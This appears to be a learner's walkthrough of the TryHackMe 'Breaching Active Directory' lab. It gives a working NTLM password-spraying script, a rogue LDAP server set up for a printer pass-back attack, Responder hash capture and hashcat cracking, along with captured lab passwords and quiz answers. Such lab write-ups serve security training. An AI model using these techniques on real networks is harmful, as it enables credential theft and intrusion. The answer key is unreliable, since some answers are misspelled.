# Breaching Active Directory

- This first section is dependent on the attackbox, resolv-dnsmask is not in kali vm by default but is on attackbox from THM website. So if using VM and VPN just add THMDC IP to the /etc/resolv.conf file. 
- This particular module requires immutable to disabled on /etc/resolv.conf. Or all connections will be on 127.0.0.1, which may cause issues later.  If not the change of resolv-dnsmasq wont take to resolv.conf when systemctl restart dnsmasq is run:

```
Check the permissions 'i' is immutable attribute
# ls -l /etc/resolv.conf && lsattr /etc/resolv.conf
-rw-r--r-- 1 root root 21 Mar 16 11:53 /etc/resolv.conf
----i---------e------- /etc/resolv.conf

#remove immutable attribute here
# chattr -i /etc/resolv.conf 
root@ip-10-48-119-205:~# ls -l /etc/resolv.conf && lsattr /etc/resolv.conf
-rw-r--r-- 1 root root 21 Mar 16 11:53 /etc/resolv.conf
--------------e------- /etc/resolv.conf
```

Breaching Active Directory – Key Points

1. Why Active Directory Matters
- ~90% of Fortune 1000 companies use Microsoft Active Directory (AD).
- AD controls identity and access across Windows environments.
- Because it “holds the keys to the kingdom,” attackers frequently target it.

2. Goal of the Room

You learn initial access techniques to obtain any valid AD credentials (even low-privileged).
These credentials allow deeper enumeration and later exploitation.

Covered techniques include:
- NTLM-authenticated services
- LDAP bind credentials
- Authentication relays
- Microsoft Deployment Toolkit abuse
- Credential leaks in configuration files

This is not an exhaustive list—just core, common real‑world entry points.

3. Getting Connected
   
AttackBox users
- You’re auto‑connected to the network.
- You must manually configure DNS:
```
sed -i '1s|^|nameserver THMDCIP\n|' /etc/resolv-dnsmasq
systemctl restart dnsmasq
```
- Replace THMDCIP with the Domain Controller’s IP.
- DNS resets every ~3 hours; redo the command if needed.

Own machine / OpenVPN
- Download the BreachingAD VPN config.
- Connect with:
```
sudo openvpn breachingad.ovpn
```
- After “Initialization Sequence Completed,” configure DNS manually (same as above).

Kali users

Use Network Manager GUI to set DNS:
- Primary: THMDC IP
- Secondary: 1.1.1.1 (or similar)
Restart NetworkManager.

4. DNS Is Critical

Kerberos requires DNS—tickets cannot use IP addresses.
If DNS breaks, everything in AD testing breaks.

DNS Debug Checklist

1. ping <THM DC IP> – confirms network is up.
2. nslookup za.tryhackme.com <THM DC IP> – confirms DC’s DNS service works.
3. nslookup tryhackme.com – confirms your external DNS is still functional.
4. If results differ or fail → redo DNS configuration.

Common issue:
- On Kali, the AD DNS server must be first in /etc/resolv.conf.

5. Expectations
- These AD networks are medium difficulty.
- You need to be comfortable troubleshooting, especially DNS.
- If stuck, always ask: “Is my DNS working?”

#either manually include thmdc ip with nameserver line or run the 'systemctl restart dnsmasq' command 

```
root@ip-10-48-119-205:~# sudo nano /etc/resolv.conf
# here first line
# nameserver <thmdc_IP_goes_here>
#if tryhackme domain name is required to be accessed
# nameserver 8.8.8.8 

root@ip-10-48-119-205:~# nslookup thmdc
;; Got SERVFAIL reply from 10.200.70.101
Server:		10.200.70.101
Address:	10.200.70.101#53

** server can't find thmdc: SERVFAIL

root@ip-10-48-119-205:~# nslookup thmmdt.za.tryhackme.com
Server:		10.200.70.101
Address:	10.200.70.101#53

Name:	thmmdt.za.tryhackme.com
Address: 10.200.70.202

root@ip-10-48-119-205:~# nslookup za.tryhackme.com
Server:		10.200.70.101
Address:	10.200.70.101#53

Name:	za.tryhackme.com
Address: 10.200.70.101

#likely should include nameserver 1.1.1.1 or nameserver 8.8.8.8 in /etc/resolv.conf
#for external tryhackme.com
root@ip-10-48-119-205:~# nslookup tryhackme.com
;; communications error to 10.200.70.101#53: timed out
;; communications error to 10.200.70.101#53: timed out
;; communications error to 10.200.70.101#53: timed out
;; no servers could be reached

root@ip-10-48-119-205:~# ping 10.200.70.101
PING 10.200.70.101 (10.200.70.101) 56(84) bytes of data.
64 bytes from 10.200.70.101: icmp_seq=1 ttl=127 time=1.32 ms
^C
--- 10.200.70.101 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 1.312/1.342/1.390/0.034 ms
root@ip-10-48-119-205:~# 

```

## Task 2 OSINT and PHISHING

OSINT (Open Source Intelligence)

OSINT involves gathering publicly available information to uncover leaked or exposed credentials. Common sources of accidental credential exposure include:

- Users posting questions on public forums (e.g., Stack Overflow) and unintentionally revealing credentials.
- Developers uploading scripts to GitHub with hardcoded passwords.
- Employees reusing work emails on external sites that later suffer data breaches.

Platforms like HaveIBeenPwned and DeHashed help identify whether corporate emails appear in known breaches.

Even if credentials are found, they may be outdated — so attackers still need a way to validate them. Later tasks (e.g., NTLM-authenticated services) provide methods to test whether discovered credentials still work.

Phishing

Phishing remains one of the most effective ways to obtain AD credentials. Two common outcomes:

- Victims enter their credentials into a fake login page.
- Victims run a malicious file that installs a Remote Access Trojan (RAT).

A RAT runs under the user’s security context, giving the attacker immediate access to that user’s AD account. This is why phishing is a major focus for both offensive and defensive teams.

## Task 3 NTLM Authenticated Services & Password Spraying

Downloadable files one the python script below and usernames as well (first.lastname format)

### NTLM & NetNTLM Authentication

- NTLM is a suite of Microsoft authentication protocols used in Active Directory.
- NetNTLM is the challenge‑response mechanism used by NTLM. It allows applications (like OWA, VPN portals, RDP gateways, web apps) to forward authentication challenges to a Domain Controller instead of validating credentials themselves.
- This means the application acts as a middle‑man, never storing AD credentials locally.
```
+--------------------+        +--------------------+        +------------------------+
|  Application User  |        |       Server       |        |    Domain Controller   |
+--------------------+        +--------------------+        +------------------------+
          |                             |                              |
          | (1) Access request          |                              |
          +---------------------------->|                              |
          |                             |                              |
          |                             | (2) Send challenge           |
          |<----------------------------+                              |
          |                             |                              |
          | (3) Send response (NetNTLM) |                              |
          +---------------------------->|                              |
          |                             |                              |
          |                             | (4) Forward challenge        |
          |                             |     + response               |
          |                             +----------------------------->|
          |                             |                              |
          |                             |        (5) Auth result       |
          |                             |<-----------------------------+
          |                             |                              |
          | (6) Grant / deny access     |                              |
          |<----------------------------+                              |
          |                             |                              |
+--------------------+        +--------------------+        +------------------------+

```

### Why NetNTLM Matters for Attackers

Many NetNTLM‑enabled services are exposed to the internet:

- Outlook Web App (OWA)
- RDP endpoints
- VPN portals integrated with AD
- Web apps using Windows Authentication

These endpoints allow attackers to test credentials found via OSINT or phishing.

### Brute‑Force vs Password Spraying

- Full brute‑force attacks are usually impossible due to account lockout policies.

- Password spraying avoids lockouts by:
    1. Trying one password across many usernames.
    2. Useful when OSINT reveals:
       Valid usernames
       Default onboarding passwords (e.g., Changeme123)

Detection Note

Password spraying generates many failed logins and can be detected by Blue Teams.

### Provided Python Password Spraying Script
The script attempts NTLM authentication against a target URL and checks HTTP response codes:

200 OK → valid credentials

401 Unauthorized → invalid credentials

Code (unchanged):
```
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

🔧 Running the Script
Command:
```
python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a
http://ntlmauth.za.tryhackme.com
```

Parameters:
- usernames.txt → list of discovered usernames
- za.tryhackme.com → AD domain
- Changeme123 → default onboarding password
- http://ntlmauth.za.tryhackme.com → NTLM‑enabled web app

The script outputs valid credential pairs as it finds them.

```
root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# nano /etc/resolv-dnsmasq 
root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# nano /etc/resolv.conf
root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# nslookup thmdc.za.tryhackme.com
Server:		10.200.70.101
Address:	10.200.70.101#53

Name:	thmdc.za.tryhackme.com
Address: 10.200.70.101

root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# 
~~~
```
### Q1 Task 3: What is the name of the challenge-response authentication mechanism that uses NTLM? 

Answer: netNTML

### Q2 Task 3: What is the username of the third valid credential pair found by the password spraying script? 

Answer: Gorden.stevens

### Q3 Task 3: How many valid credentials pairs were found by the password spraying script? Answer 4

### Q4 Task 3: What is the message displayed by the web application when authenticating with a valid credential pair? Answer 'Hello World'

How to Modify the Script to Print the Success Message
Inside this block:

```
if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
    print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
    count += 1
    continue
```    
Add: (all with spaces no tabs, even if aligns causes issues with python)

```
print(response.text)
✅ Final Modified Code Block (only the changed part)
python
if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
    print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
    print (response.text)   # <-- This prints the message shown by the web app
    count += 1
    continue
```
Example of output with our answer of message from response.text
```
...
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
<html>
<head>
</head>
<body>
Hello World
</body>
</html>
[-] Failed login with Username: louise.talbot
...
```
## Task 3 LDAP Bind Credentials

LDAP Authentication & LDAP Pass‑Back Attacks

### 1. LDAP Authentication Basics

LDAP (Lightweight Directory Access Protocol) is another method applications use to authenticate against Active Directory.
Unlike NTLM/NetNTLM:

- LDAP authentication is direct — the application itself validates the user’s credentials.
- The application uses its own stored AD service account to query LDAP.
- These credentials are often stored in plaintext inside configuration files (GitLab, Jenkins, printers, VPNs, custom apps).

If such applications are exposed to the internet, attackers can:

- Brute‑force LDAP logins
- Steal stored LDAP service credentials
- Abuse misconfigurations

### 2. LDAP Pass‑Back Attack

This attack is unique to LDAP systems and not possible with Windows Authentication (NTLM).

It works when:

- You gain access to a device’s LDAP configuration (e.g., a printer’s admin panel).
- You change the LDAP server IP to your own machine.
- When the device performs a “Test Settings” check, it sends LDAP credentials to your rogue LDAP server.

This allows you to capture the LDAP service account username and password.

Printers are especially vulnerable because:

- Admin interfaces often use default credentials (admin:admin).
- LDAP passwords are hidden in the UI but still used internally.
- Devices automatically authenticate when “Test Settings” is clicked.

### 3. Why Netcat Alone Doesn’t Work

When the printer connects back, it first tries to negotiate LDAP authentication mechanisms.

If the server supports secure SASL mechanisms, the credentials:

- Are not sent in plaintext
- Or are not sent at all

Netcat cannot emulate LDAP negotiation, so the printer refuses to send credentials.

### 4. Hosting a Rogue LDAP Server

To capture plaintext credentials, you must:

- Run OpenLDAP as a rogue server.
- Downgrade its supported authentication mechanisms to only: PLAIN and LOGIN

This is done using an LDIF patch ( create file olcSaslSecProps.ldif containing the following):

```
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
After installing slapd, run 

```
$ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo stemctl enable slapd
$ sudo dpkg-reconfigure -p low slapd
  Omitting slapd configuration as requested.
slapd.service is a disabled or a static unit not running, not starting it.
                                                                                              
$ sudo dpkg-reconfigure -p low slapd                                
  Backing up /etc/ldap/slapd.d in /var/backups/slapd-2.6.10+dfsg-1+b2... done.
  Moving old database directory to /var/backups:
  - directory unknown... done.
  Creating initial configuration... done.
  Creating LDAP directory... done.
slapd.service is a disabled or a static unit not running, not starting it.

#  olcSaslSecProps.ldif.txt  created just rename it
                                                                                              
$ ls                                                                
 Modified_ntlm_passwordspray_response_text.py   passwordsprayer-1647011410194
 olcSaslSecProps.ldif.txt                      'response_text_added to python.txt'
 passwordlist-1647876320267.txt                 slapd_password.txt
                                                                                              
$ mv olcSaslSecProps.ldif.txt olcSaslSecProps.ldif     
                                                                                              
# slapd not working fix it
$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
ldap_sasl_interactive_bind: Can't contact LDAP server (-1)
                                                                                              
$ dpkg -l | grep slapd
ii  slapd                                  2.6.10+dfsg-1+b2                         amd64        OpenLDAP server (slapd)
                                                                                              
$ sudo service slapd start               
                                                                                              
$ sudo systemctl start slapd             

# status its running now                                                                                              
$ sudo systemctl status slapd
● slapd.service - OpenLDAP Server Daemon
     Loaded: loaded (/usr/lib/systemd/system/slapd.service; disabled; preset: disabled)
     Active: active (running) since Mon 2026-06-08 04:49:18 AEST; 34s ago
 Invocation: 1467c00d202d484fb77e3643df18baf6
       Docs: man:slapd
             man:slapd-config
             man:slapd-mdb
   Main PID: 44788 (slapd)
      Tasks: 3 (limit: 2037)
     Memory: 3.3M (peak: 3.5M)
        CPU: 24ms
     CGroup: /system.slice/slapd.service
             └─44788 /usr/sbin/slapd -d0 -h "ldap:/// ldapi:///" -u openldap -g openldap

Jun 08 04:49:18 hacktop systemd[1]: Starting slapd.service - OpenLDAP Server Daemon...
Jun 08 04:49:18 hacktop slapd[44788]: @(#) $OpenLDAP: slapd 2.6.10+dfsg-1+b2 (Apr 29 2026 10:>
                                              Debian OpenLDAP Maintainers <pkg-openldap-devel>
Jun 08 04:49:18 hacktop slapd[44788]: slapd starting
Jun 08 04:49:18 hacktop systemd[1]: Started slapd.service - OpenLDAP Server Daemon.
                                                                                              
$ sudo ls /run/slapd/ldapi
/run/slapd/ldapi
                                                                                              
$ sudo netstat -tulnp | grep slapd
tcp        0      0 0.0.0.0:389             0.0.0.0:*               LISTEN      44788/slapd         
tcp6       0      0 :::389                  :::*                    LISTEN      44788/slapd         
                                                                                              
# now its working as expected
$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"

                                                                                              
$ sudo service slapd restart 
                                                                                              
$ ldapsearch -H ldap:// -x LLL -s base -b "" supportedSASLMechanisms
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: LLL supportedSASLMechanisms 
#

#
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
                                                                                              
$ 
```
The run the following line as is and retry the url http://printer.za.tryhackme.com/settings.aspx:
```
sudo tcpdump -SX -i breachad tcp port 389
```
The password is obtained for svcLDAP account (may have to send twice from the URL for it to be captured):
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Learning_modules/Breaching_Active_Directory]
└─$ sudo tcpdump -SX -i breachad tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
05:15:29.576114 IP 10.200.70.201.53173 > 10.150.70.22.ldap: Flags [SEW], seq 43895292, win 64240, options [mss 1287,nop,wscale 8,nop,nop,sackOK], length 0
....
05:23:36.473311 IP 10.200.70.201.53362 > 10.150.70.22.ldap: Flags [P.], seq 1048987133:1048987198, ack 2306066694, win 1025, length 65
        0x0000:  4500 0069 7f18 4000 7f06 da39 0ac8 46c9  E..i..@....9..F.
        0x0010:  0a96 4616 d072 0185 3e86 45fd 8973 c906  ..F..r..>.E..s..
        0x0020:  5018 0401 87bb 0000 3084 0000 003b 0201  P.......0....;..
        0x0030:  0e60 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
        0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
        0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
        0x0060:  6461 7070 6173 7331 40                   dappass1@
...
```


This forces the printer to authenticate using insecure methods.

### 5. Capturing the Credentials

Once the rogue LDAP server is running:

- Click Test Settings on the printer page.
- The printer sends the LDAP bind request to your server.
- Use tcpdump to capture the plaintext credentials.

Example captured credentials (from your document):

```
za.tryhackme.com\svcLDAP
password11
```

tryhackmeldappass1@

### Q1 What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems? 

Answer: Pass‑back Attack

### Q2 What two authentication mechanisms do we allow?	

Answer: LOGIN, PLAIN

### Q3 What is the password associated with the svcLDAP account? 

Anwswer: tryhackmeldappass1@



## Task 4 Authentication Relays

NetNTLM Attacks via SMB, LLMNR/NBT‑NS Poisoning & Responder

1. SMB & NetNTLM Authentication

SMB (Server Message Block) is a core Windows protocol used for:

- File sharing
- Printer communication
- Remote administration
- Inter‑service communication

Older SMB versions have weak authentication protections.
SMB uses NetNTLM challenge‑response authentication, which can be:

- Captured → cracked offline
- Relayed → used to authenticate to another host without knowing the password

2. LLMNR, NBT‑NS, and WPAD Poisoning
Windows networks use fallback name‑resolution protocols:

- LLMNR (Link‑Local Multicast Name Resolution)
- NBT‑NS (NetBIOS Name Service)
- WPAD (Web Proxy Auto‑Discovery Protocol)

These protocols broadcast queries like:

- “Who is FILESERVER?"
- “Who is PRINTER?”
- “Where is the proxy?”

A rogue device can answer these broadcasts and claim:

- “I am FILESERVER — connect to me.”

This forces victims to authenticate to the attacker.

3. Responder
Responder is the tool used to poison these protocols and capture authentication attempts.

It:
- Listens for LLMNR/NBT‑NS/WPAD broadcasts
- Sends poisoned replies
- Hosts fake SMB/HTTP/SQL services
- Forces the victim to authenticate
- Captures NetNTLMv2 hashes

### Q1 Task 4: What is the name of the tool we can use to poison and capture authentication requests on the network?

Answer Q1 Task4: Responder

On THM, you run:

```
sudo responder -I breachad
```
### Note if slapd is running it is on port 389 so disable as two errors will appear on port 389
I had discovered xRDP running on test machine but that should not have mattered
Just check and stop the process for now and retry:
```
sudo systemctl stop slapd
sudo systemctl status slapd
```

When a victim authenticates, you get output like:

```
[SMBv2] NTLMv2-SSP Username : ZA\<service account>
[SMBv2] NTLMv2-SSP Hash     : <hash>
```

Because you’re on a VPN, poisoning is limited — THM simulates an authentication attempt every ~30 minutes.

```
$ sudo responder -I breachad 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [breachad]
    Responder IP               [10.150.70.22]
    Responder IPv6             [fe80::5f90:7dd:2c6b:49f8]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-EOUEOGD8N76]
    Responder Domain Name      [B6OM.LOCAL]
    Responder DCE-RPC Port     [47604]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                                           

[!] Error starting TCP server on port 3389, check permissions or other servers running.
[LDAP] NTLMv1-SSP Client   : 10.200.70.201
[LDAP] NTLMv1-SSP Hostname : THMIIS
[LDAP] NTLMv1-SSP Username : za.tryhackme.com\svcLDAP
[LDAP] NTLMv1-SSP Hash     : svcLDAP::za.tryhackme.com:43C996D16995092900000000000000000000000000000000:A9768495C34BDDAF7966DE3AE222963329C38FF5BA1012BC:63742039474d2ce1                                                                   
[SMB] NTLMv2-SSP Client   : 10.200.70.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:84140fdd682af1f7:FD777C8FAF134B10880C00CE2B2F1B0E:0101000000000000800A76C009F7DC012470B1C35C5F54D10000000002000800420036004F004D0001001E00570049004E002D0045004F00550045004F004700440038004E003700360004003400570049004E002D0045004F00550045004F004700440038004E00370036002E00420036004F004D002E004C004F00430041004C0003001400420036004F004D002E004C004F00430041004C0005001400420036004F004D002E004C004F00430041004C0007000800800A76C009F7DC01060004000200000008003000300000000000000000000000002000008B10483D0820E576E7D40606685D7FC037F2E02C770833867BAD88BB851E87DD0A001000000000000000000000000000000000000900220063006900660073002F00310030002E003100350030002E00370030002E00320032000000000000000000      
```

### Q2 Task 4: What is the username associated with the challenge that was captured?

Answer Q2 Task 4: svcFileCopy

4. Cracking the Captured Hash

Once you have the NTLMv2‑SSP hash, you can crack it offline using Hashcat:
```
hashcat -m 5600 <hashfile> <wordlist> --force
```
If the password is weak, you recover valid AD credentials.

Through Hashcat password from the NTML saved to file was obtained: 
```
D:\AppsNDrivers\hashcat-6.2.6>hashcat -m 5600 -d 2 Z:\...\NTLMHash.txt Z:\...\passwordlist-1647876320267.txt
...
SVCFILECOPY::ZA:84140fdd682af1f7:fd777c8faf134b10880c00ce2b2f1b0e:0101000000000000800a76c009f7dc01247...032000000000000000000:FPassword1!
...
```
On retry I also tested LDAP and responder picks that up to. Note LDAP here is NTLM v1 not v2.
Hashcat modes: LDAP NetNTLMv1 → -m 5500, SMB NetNTLMv2 → -m 5600

```
$ hashcat -m 5500 NTLM_LDAP_Hash.txt passwordlist-1647876320267.txt --force
hashcat (v7.1.2) starting
...
svcLDAP::za.tryhackme.com:43c996d16995092900000000000000000000000000000000:a9768495c34bddaf7966de3ae222963329c38ff5ba1012bc:63742039474d2ce1:tryhackmeldappass1@
...
```
### Q3 Task 4: What is the value of the cracked password associated with the challenge that was captured? 

Answer Q3 Task4: FPassword1!

5. Relaying the Challenge
Instead of cracking the hash, you can relay it to another SMB server.

Requirements:

- SMB signing must be disabled or not enforced
- The captured account must have permissions on the target
- The relay target must accept SMB authentication
- This gives you an active authenticated session without knowing the password.
- This is the basis of SMB relay attacks.

✔ THM Questions (Answers)
Question	Answer
What tool is used to poison and capture authentication requests?	Responder
What is the username associated with the captured challenge?	(You will find this in your Responder output — format: ZA\\username)
What is the cracked password?	(You will get this after running Hashcat on your captured hash)

Setting up slapd required some work: but in the end got 
